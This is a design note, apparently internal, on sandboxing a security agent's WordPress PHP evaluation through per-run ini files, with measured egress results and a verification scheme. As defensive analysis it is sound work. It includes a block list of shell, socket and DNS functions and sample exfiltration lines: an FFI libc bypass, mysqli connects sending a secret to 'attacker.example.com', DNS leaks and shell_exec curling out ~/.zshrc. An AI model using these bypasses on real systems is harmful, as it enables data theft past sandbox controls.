# Hardening sentinel wp_eval via PHP_INI_SCAN_DIR

A design note for delivering PHP `disable_functions` (and five other directives) to the security
sentinel's analysis sandbox through a per-invocation `PHP_INI_SCAN_DIR` environment variable, replacing
the `php.ini` append-and-restart block at `agents/security-sentinel/agent.js:1757-1786` — a control that
has never taken effect on any machine and logs `Sandbox PHP hardened` while the restart it triggers
deletes the file it just wrote.

Status: design note, not a plan of record. The recommendation at the end is **do not build this yet**;
the reasoning is in "Should you build it?". Everything before that section is the honest technical
explanation the mechanism deserves, because two of the three failure explanations circulating about the
current code are wrong, and the corrections matter regardless of what you decide.

All measurements below were taken against Local's PHP 8.2.29
(`~/Library/Application Support/Local/lightning-services/php-8.2.29+0/bin/darwin-arm64/bin/php`) running
WordPress 7.0.2 on the live site `t4` (`WiuB_N1GR`), through a byte-for-byte reconstruction of the
command line `WpCliService.run` builds — same binary, same `wp-cli.phar`, same `--require`, `env -i` plus
only Local's four hardcoded environment keys. Egress was measured with a TCP/UDP listener that logs a
per-probe tag, so "blocked" means *no packet arrived*, not *the function returned false*. Claims that
were not measured are labelled inferred.

---

## How it works

PHP builds its configuration from two sources. The first is a single master `php.ini`, located either by
compiled-in default or by the `PHPRC` environment variable. The second is a *scan directory*: every file
ending in `.ini` in that directory, parsed in alphabetical order, **after** the master file. The scan
directory is chosen at compile time by `--with-config-file-scan-dir` and can be overridden at runtime by
the `PHP_INI_SCAN_DIR` environment variable. Directives in scanned files carry full `php.ini` privilege,
including `PHP_INI_SYSTEM` directives such as `disable_functions`, which `ini_set()` cannot touch.

Local's PHP is compiled with scan-dir support and leaves the default unset — `php -i` reports
`Scan this dir for additional .ini files => (none)` — and `grep -rn "PHP_INI_SCAN_DIR"
--exclude-dir=node_modules .` across the whole of `flywheel-local` returns nothing. So the variable is
free: setting it introduces a behaviour rather than overriding one.

The delivery path already exists. `flywheel-local/app/main/sites/WpCliService.ts:144-151` builds the
child environment as:

```ts
const env = {
    ...phpService?.env,
    ...opts?.env,                    // :146 — caller-supplied, merged FIRST
    PHPRC: phpService?.configPath,   // :147
    PATH,                            // :148
    MYSQL_HOME: dbService?.configPath,
    WP_CONFIG_PATH: wpConfigPath,
};
```

`env?: NodeJS.ProcessEnv` is a declared, supported member of Local's public addon API
(`flywheel-local/app/api/main.d.ts:1820-1825`). It is spread *before* the four hardcoded keys, which
means a caller can add `PHP_INI_SCAN_DIR` but cannot repoint `PHPRC`, `PATH`, `MYSQL_HOME` or
`WP_CONFIG_PATH`. That ordering is the single most important structural fact in this design: it is
exactly why the scan directory is the only viable lever — `PHPRC` is already taken by Local, and the scan
directory is purely additive on top of it.

The environment object then goes to `execFilePromise`
(`flywheel-local/app/main/_helpers/execFilePromise.ts:13`), a thin wrapper over
`child_process.execFile`. Node **replaces** rather than merges the child environment when `env` is
supplied, so the WP-CLI child sees exactly those keys and nothing from `process.env`. The scope is one
process, one invocation.

### Against S1 failure 1 — "the probe finds nothing"

**This explanation is wrong on this machine, and the correction is load-bearing.** The claim was that
`php_ini_loaded_file()` returns empty under the CLI SAPI, so the guard at `agent.js:1766` fails and the
block is silently skipped. That is true of a bare `php` invocation, and it is almost certainly where the
measurement came from. It is not true of the environment `wp_eval` actually runs in, because
`WpCliService.ts:147` sets `PHPRC` unconditionally to `Local/run/<siteId>/conf/php`, which contains a
real generated `php.ini`. Running the sentinel's own probe through the reconstructed command line
returns:

```
loaded=[…/Local/run/WiuB_N1GR/conf/php/php.ini]  scanned=[]  scandir=[]
phprc=[…/run/WiuB_N1GR/conf/php]  sapi=cli  df=[]
```

The guard at `:1766` passes. The block runs. Which makes the current code worse than "silently skipped":
it appends, restarts, has the file wiped underneath it, then polls for readiness and logs
`Sandbox PHP hardened: raw socket functions disabled (ready: true)` at `:1783`. It does not abstain; it
reports success for a setting that no longer exists.

There is nothing for the scan-dir approach to defeat here, because the failure is not real. What the scan
dir does change is that no probe is needed at all — you do not have to locate anything. You create a
directory, write a file into it, and name it in the environment.

### Against S1 failure 2 — "the write erases itself"

**This is the true and sufficient cause.** The live `php.ini` at `Local/run/<siteId>/conf/php/php.ini` is
generated from `~/Library/Application Support/Local/lightning-services/php-8.2.29+0/conf/php.ini.hbs` on
every site start. `agent.js:1769` calls `local_restart_site` specifically to make the appended directive
take effect; that restart is the same operation that regenerates the file and discards the append. The
site's current `php.ini` line 43 still reads `disable_functions =` (empty) after every experiment
documented here — corroborating the S1 observation that no `php.ini` on the machine carries the
sentinel's marker string.

The scan directory defeats this by never touching a file Local owns. The scan directory is created by the
addon, in a location the addon chooses, and is named through an environment variable read at process
startup. There is no restart, because there is no persistent state to apply — the environment is
constructed fresh for every `execFile` call. This also removes up to 30 seconds per sentinel run: the
`for (let i = 0; i < 15 …)` readiness poll at `agent.js:1773-1781` exists only to wait out the restart
the append required.

### Against S1 failure 3 — "it targets the wrong SAPI"

**Also wrong, in the opposite direction from what was assumed.** CLI and PHP-FPM load the *same*
`run/<siteId>/conf/php/php.ini` — FPM by its own configuration, CLI via the `PHPRC` that
`WpCliService.ts:147` sets. A persisted `disable_functions` there would in fact have constrained
`wp_eval`. Verified: setting `disable_functions` in a `PHPRC`-pointed directory does take effect under
`sapi=cli`.

What the scan directory offers here is not a fix for a broken targeting, but a capability `php.ini`
structurally cannot provide: **per-invocation granularity**. A `php.ini` value is one value for the
entire site until the next restart, and it applies to FPM, to the Site Shell, and to every other WP-CLI
call for as long as it survives. A scan directory named in `opts.env` applies to exactly one child
process. That is what makes the two-profile design in the next-but-one section possible, and it is what
makes it safe to run one sentinel unit under a maximal blocklist and the next one unconstrained without
any global state or any window in which the site is misconfigured for something else.

---

## The diff

**Addon-only. No change is required in `flywheel-local`.** Every mechanism this design depends on is
already present and already public: `env?: NodeJS.ProcessEnv` is declared at
`flywheel-local/app/api/main.d.ts:1824`, spread at `WpCliService.ts:146`, and reaches `execFile` at
`:163-175`. `PHP_INI_SCAN_DIR` is not set anywhere in Local, so nothing is being overridden.

The one thing you inherit rather than control is the spread order at `WpCliService.ts:144-151`. If a Local
upgrade moves `...opts?.env` after the hardcoded keys, or adds `PHP_INI_SCAN_DIR` to them, or stops
forwarding `opts` verbatim, this breaks — silently, producing `scanned=[]` with exit 0. That is a
version-pin risk that argues for a startup assertion (see "Proving it applied"), not a blocker.

### `src/main/mcp/local-services-bridge.ts` — three lines, type only

`WpCliRunOpts` at `:40-47` currently declares `skipPlugins`, `skipThemes`, `timeoutMs`. Add:

```ts
  /** Extra env merged into the WP-CLI child. Cannot override PHPRC / PATH /
   *  MYSQL_HOME / WP_CONFIG_PATH — Local sets those after the spread
   *  (flywheel-local/app/main/sites/WpCliService.ts:144-151). */
  env?: NodeJS.ProcessEnv;
```

No runtime change is needed. `wpCliRun` at `:467` already forwards `opts` verbatim
(`svc('wpCli').run(site, args, opts)`), it does not destructure or rebuild, and `svc()` at `:207-213`
returns a direct in-process object reference, so there is no serialization boundary that could drop the
field.

### `src/main/mcp/modules/wp-cli/eval.ts` — roughly forty lines

This is the only real narrowing point in the chain. The handler at `:69-73` constructs a fresh options
object from four `args` keys and discards everything else. Note that nothing upstream validates
`args`: `NexusToolProvider.invoke` passes it verbatim to `registry.call` (`NexusToolProvider.ts:57`), and
`src/main/mcp/tool-registry.ts` performs no schema validation — the registry is a dumb router. So adding
a parameter is mechanically free.

Add `harden` to `inputSchema` (`:20-41`) as an enum, and inside `execute()`, when hardening is requested:
generate a per-run nonce, create a per-run scan directory, write the `.ini` atomically (write to a temp
name and `renameSync`), prepend the assertion prologue to the caller's code, pass
`env: { PHP_INI_SCAN_DIR: scanDir }`, verify the marker on the way out, and remove the directory in a
`finally`.

**Do not expose a raw `env` map at this hop.** Not because the sentinel could abuse it — a caller that
already supplies arbitrary PHP gains nothing from `DYLD_INSERT_LIBRARIES` — but because a raw `env`
passthrough on a shared tool is the kind of thing a future non-`eval` tool copies. Take
`harden: 'analysis' | 'detonation' | 'off'` and let `eval.ts` own the directory, the file contents, and
the variable.

### `agents/security-sentinel/agent.js` — net deletion

Delete `:1757-1786` entirely: the `php_ini_loaded_file()` probe, the `appendFileSync`, the
`local_restart_site`, the fifteen-iteration two-second readiness poll, and the false log line at `:1783`.
Then thread `harden` through the call sites. There are 32 `tools.invoke('wp_eval', …)` calls in that
file; wrap them in one `evalSandbox(code, { harden })` helper rather than editing each, so the next call
site added cannot forget.

### `src/main/agent-runtime/NexusToolProvider.ts` — optional, and better than agent-side threading

The provider already keeps per-run sandbox state: `registerSandbox` at `:24-26` populates
`sandboxSiteIds`, and `invoke` at `:47-52` consults it on every `wp_eval` call to enforce site scope. The
sentinel is the only caller of `registerSandbox` in the repository (`agent.js:1753`). So the cleanest
place to set the flag is there:

```ts
if (name === 'wp_eval' && this.allowedTools && this.sandboxSiteIds.has(args.site as string)) {
  args = { ...args, harden: args.harden ?? 'analysis' };
}
```

Registration is already mandatory — without it, the existing scope check rejects the call — so "forgot to
harden" becomes unreachable. Chat, external MCP clients and the CLI all run with
`allowedTools === undefined` and short-circuit. `seo-insights` defines `allowedTools` but never calls
`registerSandbox`, so it is untouched (and its only `wp_eval` payload,
`agents/seo-insights/agent.ts:976`, is a `get_posts` call that would survive hardening anyway).
`log-processor` is not a `wp_eval` caller at all.

### `src/main/ipc-handlers.ts:4901-4919` — the one that a tool-level change does not reach

`nexus:sentinel:execute-sandbox` builds a hand-rolled `tools` shim whose comment at `:4901` says "same
path as wp_eval MCP handler". It is not the same path — it is a *copy* of `eval.ts:69-73`:

```ts
const result = await localServicesBridge.wpCliRun(
  sandboxSiteId, ['eval', code],
  { skipPlugins: !!(args.skip_plugins), skipThemes: !!(args.skip_themes), timeoutMs: 30_000 },
);
if (!result.success) throw new Error('Eval failed: ' + result.stdout);
return result.stdout?.trim() || '';
```

No `env`, no scan directory, no prologue, no marker check, and the raw stdout is returned without a JSON
parse. This is the path that executes the agent-authored remediation checklist after human approval —
`buildRemediationChecklist` and `executeChecklist` are `require()`d from the installed `agent.js` at
`:4890-4896` — and per `CLAUDE.md`'s own known-gaps list it is not audited. A `harden` parameter on
`eval.ts` never reaches it.

The durable fix is to delete the shim and call `registry.call('wp_eval', { …, harden: 'detonation' })`,
which routes it through chokepoint 1 and closes the audit gap as a side effect. Two divergent copies of a
security-critical path is precisely the drift pattern `CLAUDE.md` documents for `auditDirectOperation`.

The CLI is deliberately out of reach: `nexus wp <site>@local eval …` goes through `nexusWpCommand` and
`src/main/graphql/resolvers.ts:1770` straight to `wpCliRun`, never touching `eval.ts`. That is correct —
the CLI is the human escape hatch and should stay unhardened.

---

## The ini

Two profiles, identical except for five function names. Both are written per-run into a directory
*outside* the `open_basedir` allowlist, so the sandboxed PHP can neither read nor rewrite the file
governing its own next invocation.

### Profile A — ANALYSIS (`--skip-plugins --skip-themes`)

```ini
; Nexus AI security-sentinel — sandbox isolation, ANALYSIS profile.
; Delivered via PHP_INI_SCAN_DIR on the wp_eval child only. Never edit the site php.ini:
; Local regenerates run/<siteId>/conf/php/php.ini from php.ini.hbs on every start.
; Applies to every unit classified BYTES or SQL. No attacker code executes under this
; profile, so it can be maximally strict.

; ── Egress: raw sockets, exec, DNS ───────────────────────────────────────────
;   fsockopen/pfsockopen/stream_socket_* : the classic reverse shell and the WP HTTP
;     API's Fsockopen transport. stream_socket_client is the one the current list at
;     agent.js:1767 omits, and it is functionally identical to the fsockopen it blocks.
;   socket_*  : ext/sockets is statically compiled; socket_create + socket_connect is a
;     second, independent TCP path the fsockopen family does not cover. Measured OPEN
;     at baseline; the current sentinel list misses it entirely.
;   curl_*    : WordPress's preferred HTTP transport. With these gone, wp_remote_get()
;     degrades to a clean WP_Error("No working transports found") — verified, not fatal.
;   ftp_*     : ext/ftp is compiled in; ftp_connect is a bare TCP connect.
;   dns_*/checkdnsrr/getmxrr/gethostby* : DNS is a data channel. 63 bytes per label
;     exfiltrates fine and never opens a socket you can see.
;   syslog/openlog : syslog can be pointed at a remote collector.
;   get_headers    : an HTTP GET wearing a different name.
;   mail      : safe to block here only because no plugins run under this profile.
disable_functions = fsockopen,pfsockopen,stream_socket_client,stream_socket_server,stream_socket_pair,socket_create,socket_create_pair,socket_create_listen,socket_connect,socket_bind,socket_listen,socket_accept,socket_send,socket_sendto,socket_sendmsg,socket_write,socket_read,socket_recv,socket_recvfrom,socket_export_stream,socket_import_stream,curl_init,curl_exec,curl_multi_init,curl_multi_exec,curl_multi_add_handle,curl_setopt,curl_setopt_array,curl_share_init,curl_file_create,ftp_connect,ftp_ssl_connect,dns_get_record,dns_check_record,dns_get_mx,checkdnsrr,getmxrr,net_get_interfaces,syslog,openlog,get_headers,mail,gethostbyname,gethostbynamel,gethostbyaddr,gethostname,exec,shell_exec,system,passthru,proc_open,proc_close,proc_get_status,proc_nice,proc_terminate,popen,pclose,pcntl_exec,pcntl_fork,pcntl_alarm,pcntl_signal,posix_kill,putenv,dl,phpinfo

; ── URL-as-file ──────────────────────────────────────────────────────────────
; Off unregisters the http/https/ftp stream wrappers at the fopen layer, which kills
; file_get_contents(url), fopen(url), copy(url), readfile(url), file(url),
; getimagesize(url), get_meta_tags(url), SplFileObject(url), DOMDocument::load(url) and
; simplexml_load_file(url) in one line — all measured OPEN at baseline. It is also what
; actually stops XXE and XSLT document() remote fetch, since those happen inside
; libxml2, below any PHP function name. Verified not bypassable via
; stream_wrapper_restore('http'). PHP_INI_SYSTEM, so ini_set() cannot undo it.
allow_url_fopen = Off
; include('http://…') as remote code loading. Already Off in Local's generated php.ini;
; restated so the profile is self-describing and survives a template change.
allow_url_include = Off

; ── Egress: object-oriented clients disable_functions structurally cannot see ─
; PHP 8's zend_disable_class() leaves a hollow stub: the name survives (class_exists
; returns true, `new` returns an object) but every method is gone. Measuring
; class_exists() therefore tells you nothing — measure the method call.
;   SoapClient : with disable_functions alone it POSTed to the listener (tagged hit).
;     With this line, __soapCall is undefined and no packet leaves.
;   PDO        : a second full network stack. WordPress does not use it — wpdb is
;     procedural mysqli — so disabling it costs nothing. Verified: WP boots, $wpdb
;     works, five plugins load.
; Deliberately NOT here: mysqli. See "What it does not stop".
disable_classes = SoapClient,SoapServer,SoapVar,SoapHeader,SoapParam,SoapFault,PDO,PDOStatement

; ── The bypass that makes everything above moot if you omit it ────────────────
; FFI is statically compiled in and ffi.enable defaults to "preload", which the CLI SAPI
; honours as enabled. Measured under the FULL blocklist above:
;   FFI::cdef("int system(const char*);","libc.dylib")->system("curl …")  → egress.
; Direct libc, no PHP function involved. This one line is the difference between a
; blocklist and a bypassed blocklist. PHP_INI_SYSTEM; ini_set('ffi.enable','1') refused.
ffi.enable = 0

; dl() loads a shared extension at runtime, and a loaded extension is new native code
; with no regard for anything above. Available specifically in the CLI SAPI.
enable_dl = Off

; mail() is a popen() of this string — and so is error_log($msg, 1, $to), which is NOT
; gated by disable_functions=mail. Measured: with sendmail_path pointed at a script and
; mail disabled, error_log(type 1) executed the script and egressed. Local's default
; here is a mailpit command line. /usr/bin/false makes both a no-op. PHP_INI_SYSTEM.
sendmail_path = /usr/bin/false

; NOT a security control — a correctness one, and mandatory. PHP's CLI SAPI writes
; warnings to STDOUT, and open_basedir makes WP-CLI emit two on every run (is_readable
; on ~/.wp-cli/config.yml and on cwd). eval.ts returns result.stdout verbatim, so
; without this every unit's JSON is prefixed with warning text. This is PHP_INI_ALL and
; attacker code can re-enable it; that is a stdout-corruption nuisance, not a hole.
display_errors = Off

; ── Filesystem containment ───────────────────────────────────────────────────
; The only directive here that limits filesystem reach. Without it the sandboxed PHP
; reads ~/.zshrc, Local's sites.json and the sentinel's own agent.js — all measured
; OPEN at baseline — and can write anywhere the user can.
; Each path is load-bearing:
;   <webroot>       the site under analysis
;   extraResources  Local injects auto_prepend_file=…/extraResources/local-bootstrap.php
;                   and runs wp-cli.phar from …/extraResources/bin/wp-cli. Omit it and
;                   PHP fatals before WP-CLI starts.
;   temp dirs       sys_get_temp_dir() resolved to /var/tmp in the reconstructed env and
;                   follows TMPDIR, which Local's phpService.env may set. COMPUTE it at
;                   sandbox setup with one unhardened `wp eval 'echo sys_get_temp_dir();'`
;                   rather than hardcoding this list.
; Verified: WP boots, mysqli connects over its unix socket (not subject to open_basedir),
; and a recursive WP_CONTENT_DIR walk returns byte-identical results to the unhardened
; run (1680 files, 1207 read, 18 flagged).
; PHP_INI_ALL but narrowing-only: once set, ini_set() to a WIDER path is refused,
; to a narrower one is allowed — so always emit the line, never conditionally. With it
; unset, ini_set('open_basedir','/') succeeds.
open_basedir = <WEBROOT>:/Applications/Local.app/Contents/Resources/extraResources:/tmp:/private/tmp:/var/tmp:/private/var/tmp
```

### Profile B — DETONATION (FS-MISMATCH and the remediation checklist, plugins loaded)

Byte-identical to Profile A except that **five names come out of `disable_functions`**: `mail`,
`gethostbyname`, `gethostbynamel`, `gethostbyaddr`, `gethostname`.

Not because the sentinel needs them. Because WordPress core calls two of them unguarded, and in PHP 8 a
disabled function raises `Error`:

```
mail disabled          → wp_mail() → Error: Call to undefined function PHPMailer\PHPMailer\mail()
                          at wp-includes/PHPMailer/PHPMailer.php:893 (uncaught — wp_mail catches
                          PHPMailer\Exception, not \Error)
gethostbyname disabled → wp_safe_remote_get() → Error: Call to undefined function gethostbyname()
                          from wp-includes/http.php:591, unguarded in wp_http_validate_url()
gethostbyaddr          → wp-includes/pluggable.php:1824, 2037 (comment notification path)
```

A fatal inside a plugin under this profile is not a failed check — it is a check that returns "clean".
`agent.js:2143-2156` wraps the FS-MISMATCH result in `try { JSON.parse(…) } catch {}`, so a fatal sets
`adminMismatch = false`. `mail()` egress is still closed by `sendmail_path`, which attacker code cannot
change. DNS egress via `gethostbyname('secret.attacker.com')` is open under Profile B and should be
stated in the report rather than hidden.

Verified under Profile B with plugins loaded: `wp_version 7.0.2`, `plugins_loaded 5`,
`included_plugin_files 501`, `fs_mismatch {db:1, wp:1}`, `wp_mail() → false` (no fatal),
`wp_safe_remote_get() → WP_Error` (no fatal), and nothing on the listener except the mysqli probe.

**The inversion worth noticing.** The brief anticipated that the unit which must detonate attacker code
would need a looser profile. It does not. FS-MISMATCH is `$wpdb->get_var` on a `users`/`usermeta` join
plus `count(get_users(['role' => 'administrator']))`. Both ran correctly under the full maximal blocklist
with five plugins and 501 plugin files loaded. `--skip-plugins` controls *whose code runs*; the scan
directory controls *what that code can do*. Those are orthogonal axes, and the current design conflates
them. The five-name gap in Profile B is a compatibility shim for unguarded core calls, not a capability
the unit requires.

Which points at a prerequisite: **fix the failure mode before you loosen the profile.** If FS-MISMATCH
distinguished "eval errored" from "counts matched", it could run under Profile A and fall back to B only
on a recorded fatal, noting in the report which profile produced the answer. As written, a silent
`catch {}` on a security check is a worse defect than the ini ever was.

Two directives deliberately omitted from both. `Imagick` and `XSLTProcessor` in `disable_classes` — both
stub cleanly and `t4` still boots, but `class_exists('Imagick')` returning true for a hollow class is
exactly the shape that breaks a plugin's capability detection at load time, and under Profile B a
load-time fatal is a silent false negative. Add them to A if you want; keep them out of B. And `mysqli`
in `disable_classes` — verified that it does *not* break `wpdb` (WordPress uses the procedural API) and
does *not* stop egress (so does an attacker). A line that implies protection it does not provide is worse
than no line.

---

## What it stops, and what it does not

### Stops (measured, packet-level)

Sixteen probes at three configurations. "EGRESS" means the listener's `accept()` fired.

| Channel | Baseline | + maximal `disable_functions`, `allow_url_fopen=Off` | + `disable_classes`, `ffi.enable=0` |
|---|---|---|---|
| `curl_exec`, `fsockopen`, `stream_socket_client` | EGRESS | blocked | blocked |
| `file_get_contents(url)`, `fopen(url)` | EGRESS | blocked | blocked |
| `socket_create` (ext/sockets) | EGRESS | blocked | blocked |
| `ftp_connect` | EGRESS | blocked | blocked |
| `mail()` to Local's mailpit | EGRESS | blocked | blocked |
| `gethostbyname`, `dns_get_record` | EGRESS | blocked | blocked |
| `DOMDocument::load(url)`, SimpleXML(url), XXE, XSLT `document()` | EGRESS | blocked | blocked |
| `stream_wrapper_restore('http')` then `file_get_contents` | EGRESS | blocked | blocked |
| **`SoapClient`** | EGRESS | **EGRESS** | blocked |
| **`PDO`** | EGRESS | **EGRESS** | blocked |
| **`FFI` raw `socket()`/`connect()`** | EGRESS | **EGRESS** | blocked |
| **`mysqli` procedural** | EGRESS | **EGRESS** | **EGRESS** |

The S1 canary figure of "8 of 8 open at baseline, 0 of 8 under the maximal list" is correct as far as its
eight probes go. The fuller picture: a maximal `disable_functions` list alone leaves *four* channels open
that the canary did not enumerate — `SoapClient`, `PDO`, `FFI`, and `mysqli`. `disable_classes`,
`ffi.enable=0` and `allow_url_fopen=Off` close the first three. Roughly **nine of thirteen** channels are
closed by the function list; three more by the class list and the two ini switches; one remains.

Also stopped, and worth naming separately because no other directive touches it: **filesystem reach**.
Under `open_basedir`, `~/.zshrc`, Local's `sites.json`, and — critically — the installed
`agents/security-sentinel/agent.js` that `ipc-handlers.ts:4890-4896` `require()`s at runtime all become
unreadable and unwritable. Without it, the sandboxed PHP can silently rewrite the remediation executor
for all future runs.

And **HTTP to Local's own control plane**. Ports 4000 (GraphQL) and 13000 (the AI gateway) are open on
the host, but under the maximal profile there is no primitive left to form an HTTP request with. This is
a genuine boundary and an argument against weakening the profile.

### Does not stop

**`disable_functions` cannot see `SoapClient` or `mysqli`, and the two have different answers.**
`disable_functions` matches function names in the symbol table. A method call is not a function name, so
an object-oriented network client is structurally invisible to it.

For `SoapClient`, `disable_classes` is the answer and it works. The earlier finding that it is inert
measured the wrong signal: PHP 8's `zend_disable_class()` leaves a hollow stub, so `class_exists()` still
returns true and `new SoapClient(…)` still constructs — but `__soapCall()` is undefined and, measured
against the listener, nothing leaves. Costs nothing: neither WordPress nor the sentinel uses SOAP. Same
for `PDO`.

For `mysqli`, there is no answer. This is the wall:

- The extension is statically compiled into Local's PHP (`php -n -m` lists `soap, mysqli, PDO,
  pdo_mysql, sockets, ftp, curl, xsl, dom, SimpleXML, FFI`). The only `extension=` line in the generated
  `php.ini` is imagick at line 104, with opcache and xdebug as `zend_extension` at 180 and 186. **No ini
  directive unloads a built-in extension.**
- `disable_classes = mysqli` blocks only the object-oriented form. WordPress's `wpdb` uses the procedural
  API, and so does an attacker: `mysqli_connect()` still reached the listener with `disable_classes=mysqli`
  set.
- Disabling the *functions* `mysqli_connect`, `mysqli_real_connect`, `mysqli_init` kills WordPress at
  bootstrap: *"Your PHP installation appears to be missing the MySQL extension which is required by
  WordPress."* That takes out every SQL unit including FS-MISMATCH itself.

So under every profile that boots WordPress, `mysqli_real_connect($link, 'attacker.example.com',
$secret, '', 'wp', 3306)` opens arbitrary outbound TCP and transmits the username and database fields in
the client handshake, in cleartext, before any authentication check. Confirmed: the connection lands
(`errno=2006 "MySQL server has gone away"` against a non-MySQL listener means TCP was established and
bytes were exchanged). A cooperating `mysqld` at the far end logs the field.

And a second channel on the same primitive: with `gethostbyname` disabled, `mysqli_real_connect` still
resolves an attacker-controlled hostname — confirmed, `errno=2002 php_network_getaddresses: getaddrinfo
for exfil-probe-9dd4e461.example.com failed`. The resolution happens in libc inside the extension, below
the symbol table. **DNS exfiltration survives even when every DNS function is disabled.**

The honest scorecard is therefore not "0 of 8". It is **one residual channel under Profile A (mysqli
TCP), two under Profile B (mysqli TCP plus direct DNS)**, and both are enough to exfiltrate a database
password with about ten lines of PHP. Publish that figure, not the canary's.

Three further things it does not do:

- **It does not prevent detonation.** `--skip-plugins` does not skip mu-plugins. A malicious
  `wp-content/mu-plugins/*.php` runs during bootstrap on *every* `wp_eval` the sentinel makes, all 32 call
  sites, read-only probes included. Verified against a planted mu-plugin on `t4`: it ran, wrote its
  marker, and egressed via mysqli under the maximal ini, all before the eval payload executed. The ini
  narrows what each detonation can do; it cannot stop or reduce the number of detonations. The real
  mitigations are out of band — read `wp-content/mu-plugins` as bytes from Node first and refuse to
  `wp_eval` at all if anything is unexpected, or run every executing unit on a throwaway clone.
- **It is not shippable while `shell_exec` survives anywhere in the sandbox path.** `open_basedir`
  applies to PHP's file layer, not to a child process. Measured with `shell_exec` allowed and
  `open_basedir` set: `{"php_read_home":"blocked","shell_read_home":"OPEN via shell_exec",
  "shell_curl_out":"<?xml version=\"1.0\"?><r>ok</r>"}`. One surviving exec function reads `~/.zshrc` and
  curls it out under a profile that looks locked down. There is no partial credit. The sentinel currently
  needs `shell_exec` at `agent.js:1050` (`core verify-checksums`), `:1494` (`strings`) and `:3038`
  (`config shuffle-salts`), and curl for `wp_remote_get` at `:1441, 2343, 2398, 2896, 2911` — while
  simultaneously listing `shell_exec` on its own blocklist at `:1767`. The profile is only deployable
  after those move to Node.
  - Side finding, **inferred not verified**: `agent.js:1050` may already be dead.
    `shell_exec('wp --skip-plugins --skip-themes core verify-checksums')` returned
    `sh: wp: command not found` in the reconstructed environment, because `WpCliService.ts:120-126`
    builds `PATH` from `process.env.PATH` plus the db and php service paths and does not add Local's
    wp-cli shim — only `SiteShellEntryService.ts:180` does, for the interactive Site Shell. Whether it
    works in production depends on whether the Finder-launched Electron process inherits
    `/usr/local/bin`. Check with `tools.invoke('wp_eval', {site, code: "echo shell_exec('command -v wp');"})`.
- **A disabled function is a catchable `Error`, not a fatal.** Malware written as
  `try { curl_exec(…) } catch (\Throwable) { /* next channel */ }` degrades gracefully to the next
  channel. `disable_functions` slows a generic payload; it does not stop one written for it.

---

## Proving it applied

The predecessor failed silently for weeks and reported success while doing so. `agent.js:1783` logs
`Sandbox PHP hardened: raw socket functions disabled (ready: ${ready})`, where `ready` measures *whether
`wp_eval` responds at all* — a fact unrelated to hardening. `ready: true` with zero hardening is the
normal case. The line asserts something it never tested. Any replacement has to be verified, not
attempted, or it is the same bug with better prose.

### The constraint that shapes the design

`execFilePromise.ts:13-20` binds `stderr` in its callback and then discards it. It never reaches
`wpCliRun` (`local-services-bridge.ts:467`), never reaches `eval.ts:69`, never reaches the agent. And on
a non-zero exit, `execFile` rejects with the error and stdout is lost too — measured: the callback
receives the stdout, but `err.stdout` is `undefined` and `execFilePromise` rejects with `err`.

**There is exactly one channel out of the child: stdout, on a zero exit.** So anything you want to know
about hardening must be echoed to stdout and the failure path must `exit(0)`.

### Six ways delivery fails silently

| Condition | `php_ini_scanned_files()` | `disable_functions` | exit |
|---|---|---|---|
| `PHP_INI_SCAN_DIR` points at a nonexistent directory | `[]` | `[]` | 0 |
| Directory exists, contains no `.ini` file | `[]` | `[]` | 0 |
| `.ini` file mode `000` | `[]` | `[]` | 0 |
| Directory mode `000` | `[]` | `[]` | 0 |
| **Relative** path | `[]` | `[]` | 0 |
| Environment not propagated at all | `[]` | `[]` | 0 |

Two more that are worse than silent:

- **Malformed ini discards the whole file.** `printf 'this is not valid ini {{{\ndisable_functions = curl_exec\n'`
  produces `PHP: syntax error, unexpected '{'` on **stderr** (destroyed), `scanned=[]`, and the valid
  directive on line 2 does not apply. Exit 0.
- **A torn write is accepted as a weaker policy.** `disable_functions = curl_exec,shell_ex` (truncated,
  no trailing newline) yields `scanned=[…/zz.ini]  df=[curl_exec,shell_ex]`. `shell_ex` is not a
  function; **`shell_exec` is live** — and `php_ini_scanned_files()` reports the file as parsed, so a
  naive "did the file get parsed?" check passes. `fs.writeFileSync` is not atomic with respect to a
  concurrent reader. Write to a temp name and `renameSync`.
- **Multiple files: last alphabetically wins, and `disable_functions` does not merge.** `aa.ini` with
  `curl_exec` and `zz.ini` with `shell_exec` yields `df=[shell_exec]` — `curl_exec` is live. A stale file
  from an earlier run that sorts after yours silently replaces your policy with a weaker one. Use a fresh
  per-run directory and `rmSync` it in a `finally`.

### The prologue

`eval.ts` prepends this when hardening is requested. `__NONCE__` is the same hex that names the directory
and the `.ini` file.

```php
$__n = '__NONCE__';
$__req = ['curl_exec','curl_multi_exec','shell_exec','exec','system','passthru',
          'proc_open','popen','fsockopen','pfsockopen','stream_socket_client',
          'stream_socket_server','socket_create','dns_get_record','checkdnsrr'];
$__f = [];
foreach ($__req as $__x) { if (function_exists($__x)) { $__f[] = $__x; } }
if (ini_get('allow_url_fopen'))                      { $__f[] = 'allow_url_fopen'; }
if (ini_get('ffi.enable'))                           { $__f[] = 'ffi.enable'; }
if (strpos(php_ini_scanned_files(), $__n) === false) { $__f[] = 'ini-not-parsed'; }
if ($__f) {
    fwrite(STDOUT, "__NEXUS_HARDEN_FAIL__{$__n}:" . implode(',', $__f));
    exit(0);   // exit 0 — a non-zero exit destroys stdout in execFilePromise
}
fwrite(STDOUT, "__NEXUS_HARDEN_OK__{$__n}\n");
```

Two independent axes on purpose. `function_exists` proves the policy is in effect; the nonce proves it
came from *your* file this run. Neither alone is sufficient — the torn-write case defeats a file check,
the stale-file case defeats an effect check. `fwrite(STDOUT, …)` rather than `echo` because under Profile
B attacker code has bootstrapped first and could have called `ob_start()`. Cost is fifteen
`function_exists` symbol-table lookups, no syscalls, no extra process.

`eval.ts` then verifies on the way out and returns an **error**, never a warning:

```ts
const okTag = `__NEXUS_HARDEN_OK__${nonce}`;
const failTag = `__NEXUS_HARDEN_FAIL__${nonce}:`;
const f = out.indexOf(failTag);
if (f !== -1) return error(`HARDENING_NOT_IN_EFFECT: ${out.slice(f + failTag.length).split('\n')[0]}`);
if (!out.startsWith(okTag)) return error('HARDENING_NOT_IN_EFFECT: assertion marker absent');
return ok(out.slice(okTag.length).trim() || '(no output)');
```

The `!out.startsWith(okTag)` branch is the one that catches the failure you have not thought of — a Local
upgrade that strips `env`, an ini format change, anything. **Absence of proof is treated as failure.**
That is the entire difference from the current design.

One honest limit, and it is not small: under Profile B the prologue runs after WordPress bootstrap, which
means after attacker code. See the red team section — the in-band marker is forgeable by anything running
in the same process. The mitigation is an out-of-band probe: immediately before the first plugins-loaded
call, issue one bare `php -r` (no WordPress, therefore no mu-plugin) against the same scan directory and
